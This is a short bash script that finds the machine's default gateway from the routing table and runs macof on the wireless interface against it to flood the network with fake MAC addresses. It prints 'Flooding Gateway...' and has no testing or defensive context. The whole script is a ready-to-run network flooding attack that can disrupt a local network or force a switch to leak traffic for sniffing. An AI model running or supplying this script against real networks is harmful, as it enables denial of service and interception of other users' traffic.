#!/bin/bash
clear
echo 'Flooding Gateway...'
route > temp1.txt
gateway_addr_var=$(more temp1.txt | grep default | tr -s ' ' | cut -d ' ' -f 2)
rm temp1.txt
sudo macof -i wlan0 -d $gateway_addr_var

